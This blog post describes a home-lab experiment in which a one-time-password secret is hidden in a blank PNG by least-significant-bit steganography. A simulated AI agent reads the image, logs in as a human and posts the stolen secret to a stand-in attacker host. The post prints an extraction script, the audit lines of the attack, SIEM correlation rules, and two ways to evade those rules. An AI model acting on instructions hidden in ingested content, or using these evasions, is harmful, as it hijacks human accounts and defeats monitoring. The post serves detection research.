---
title: 'The blank image my AI agent should not have trusted'
description: 'I hid a one-time-password secret inside a plain white picture, let a simulated AI agent read it, and watched the agent log in as a human. No scanner would flag the image. So I stopped looking at the image and wrote a detection for the one thing the attack cannot hide: what the agent identity did next.'
pubDate: 'Nov 11 2026'
heroImage: '../../assets/blog-placeholder-3.jpg'
---

A question I asked this week turned into a lab. I had been reading about older malware
families like Stegoloader and ZeusVM, which carried their configuration or their next stage
inside ordinary image files. The picture opens fine, looks like nothing, and the bytes that
matter are tucked into parts of it nobody looks at.

My dissertation is about non-human identities, and specifically AI agents: software that
holds credentials, calls tools and acts without someone approving each step. So the question
became: what happens when the thing reading the picture is not a person, but an agent with a
token in its pocket?

## The setup

Everything here ran on my own lab, against accounts and secrets that exist only for the test.

There are three parts:

- **A carrier image.** A 256x256 white PNG with a TOTP enrolment string (the same data a
  "scan this QR code" screen gives your authenticator app) written into the least significant
  bit of each colour value.
- **A simulated agent.** A small program with a workload identity and three audited tools:
  read a file, log in to an identity provider, post data out. Every tool call writes one line
  to an audit trail: who, which tool, what target. Never the content.
- **A SIEM.** My Wazuh instance, receiving that audit trail.

It is a simulator, not a real language model being tricked. I wanted to test the detection,
and for that I needed the behaviour to be repeatable, not an LLM that follows the hidden
instruction on some runs and ignores it on others.

## Hiding the secret

Least-significant-bit steganography is the textbook method. A white pixel is 255, 255, 255.
Change the last bit and it becomes 254, which no eye and no monitor will distinguish. Do that
across a few hundred colour values and you have room for a short string.

### The image

This is the carrier. It is the real file, not a mock-up. I have put a thin border on it
because otherwise you could not find it on the page.

<img src="/nhi-stego/carrier.png" alt="A plain white square: the carrier image with data hidden in it" width="256" height="256" style="border: 1px solid #999;" />

You can [download it](/nhi-stego/carrier.png) and check it yourself. It is not malware in the
sense of something that runs. It is a picture with a message hidden in it, and the message is
a throwaway secret I generated for this post and enrolled nowhere.

```
image size            : 256x256 RGB
channel values changed: 527 of 196608 (0.268%)
max change per channel: 1 / 255
sha256 (file)         : 775bf73b32cb71971b6a1a8f0ff206e2dd0ffa796a4164226ac17eb327790aed
```

About a quarter of one percent of the values moved, each by one step out of 255.

### The same image, revealed

To see anything you have to throw away the top seven bits of every colour value and blow the
last one up to full brightness. This is the top four rows of that same file, treated that way
and enlarged:

![The lowest bit of each colour value in the top rows of the carrier, amplified. The speckled part is the hidden data; the solid white after it is untouched image.](../../assets/nhi-stego/lsb-plane-amplified.png)

The speckle is the hidden data. Read those bits back in order and you get this:

```
otpauth://totp/NHI-Lab-Demo:demo-user%40example.invalid?secret=A6IBIFZUHNYNT656KD5NXRA4KBW7ACOQ&issuer=NHI-Lab-Demo
```

That is the exact string an authenticator app receives when you scan an enrolment QR code.
Whoever holds it can generate the same six-digit codes as the account owner.

If you want to pull it out of the downloaded file yourself, this is all it takes:

```python
from PIL import Image

raw = Image.open("carrier.png").convert("RGB").tobytes()
bits = [b & 1 for b in raw]

def take(start, n):
    return bytes(int("".join(map(str, bits[(start + i) * 8:(start + i) * 8 + 8])), 2)
                 for i in range(n))

assert take(0, 4) == b"NHI1"                       # my marker
print(take(8, int.from_bytes(take(4, 4), "big")).decode())
```

## What the agent did with it

The attack run is three tool calls:

```
agent=spiffe://nhi.lab/agent/doc-summariser-demo event=image_read tool=read_file target=carrier.png
agent=spiffe://nhi.lab/agent/doc-summariser-demo event=auth_ok   tool=idp_login target=totp:human/alex
agent=spiffe://nhi.lab/agent/doc-summariser-demo event=egress    tool=http_post target=cdn.attacker.invalid/status-pixel.png
```

It read the image, recovered the enrolment secret, generated a valid six-digit code and
authenticated as a human account. Then it wrote the stolen secret into a second white image
and posted that out. The second factor on that account was cloned by a piece of software that
was only supposed to summarise documents.

The part that matters for identity people: every one of those steps used a legitimate
credential. Nothing was brute-forced and nothing failed. An authentication log on its own
shows one successful login.

## Why I did not try to detect the image

I could have written a rule that looks for my marker bytes in PNG files. It would have caught
my own test and nothing else. A real attacker encrypts the payload, spreads it across the
image, or uses a different format, and the rule is dead.

The image is the attacker's home ground. They choose the encoding and I have to guess it.

What they do not control is the audit trail of the identity they hijacked. To get any value
from the stolen secret, the agent has to *do* something with it, and that action is logged
under the agent's own name.

## The detection

Two correlation rules, keyed on the agent identity:

- the same agent ingests an image and then authenticates within two minutes
- the same agent ingests an image and then posts data out within five minutes

Neither rule knows anything about steganography. Here is what the SIEM produced for the
attack run (addresses removed):

```json
{
  "rule": {
    "id": "100664",
    "level": 12,
    "description": "NHI chain: agent spiffe://nhi.lab/agent/doc-summariser-demo ingested an image then authenticated (totp:human/alex) - possible hidden-image credential theft / prompt injection",
    "mitre": ["T1027.003", "T1111", "T1078"]
  }
},
{
  "rule": {
    "id": "100665",
    "level": 12,
    "description": "NHI chain: agent spiffe://nhi.lab/agent/doc-summariser-demo ingested an image then posted data out (cdn.attacker.invalid/status-pixel.png) - possible covert exfiltration",
    "mitre": ["T1027.003", "T1041"]
  }
}
```

I also wrote the same logic as a vendor-neutral Sigma correlation rule, so it is not tied to
one product.

## Proving it does not just fire on everything

A rule that alerts on the attack is half a test. I wrote the tests first, watched them fail,
then ran four controls against the live SIEM. Each run used a unique agent identity so I was
only counting that run's alerts.

| Scenario | Image read | Auth | Chain alert |
|---|---|---|---|
| Attack: read image, authenticate, post out | yes | yes | **fired (both rules)** |
| Agent reads a clean image, does nothing else | yes | no | quiet |
| Agent authenticates, no image read before it | no | yes | quiet |
| One agent reads an image, a different agent authenticates | yes | yes | quiet |
| Same agent reads, then authenticates after the two-minute window | yes | yes | quiet |

## What this does not prove

The last two rows of that table are also the two ways around the rule.

If the attacker can make one agent read the image and a second agent use the secret, the
correlation never joins up. If they wait three minutes instead of one, same result. A longer
window catches the patient attacker and buries you in false alarms from agents that
legitimately read images all day.

There is also the plain false-positive problem. Some agents are supposed to read an image and
then log in somewhere. The rule needs a baseline per agent identity before it is useful
outside a lab.

So I would not rely on detection alone. The better fix is to make the stolen secret worth
less in the first place:

- **The agent should not be able to authenticate as a human at all.** A workload identity
  presenting a person's second factor is wrong whatever came before it. That is a policy the
  identity provider can enforce without any correlation.
- **Scope the agent's credential to the task.** A document summariser has no business holding
  a tool that posts to arbitrary hosts.
- **Treat everything the agent ingests as data, never as instruction.** Easy to write, hard
  to build.
- **Use phishing-resistant factors for humans.** A passkey has no shared secret to hide in a
  picture.

## What I took from it

I started with a question about an old malware trick and ended up at the argument my
dissertation is making. With a human user, we assume the person behind the credential will not
be talked into something by a blank picture. An agent gives us no such assurance. It reads
whatever it is handed, and it holds real access.

I could not have caught that image by inspecting it. I caught the agent by watching what its
identity did in the next two minutes.
